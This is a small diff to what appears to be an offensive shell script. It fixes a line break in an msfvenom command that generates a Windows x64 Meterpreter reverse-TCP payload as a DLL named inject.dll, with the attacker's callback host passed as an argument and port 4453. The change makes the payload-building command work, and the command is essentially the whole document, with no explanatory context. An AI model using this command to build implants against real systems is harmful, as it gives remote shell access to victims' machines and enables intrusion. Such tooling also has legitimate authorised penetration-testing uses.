@@ -11,5 +11,4 @@ if [ $# -eq 0 ] ; then
     exit 1
 fi
 
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 
-LPORT=4453 -f dll > inject.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=4453 -f dll > inject.dll
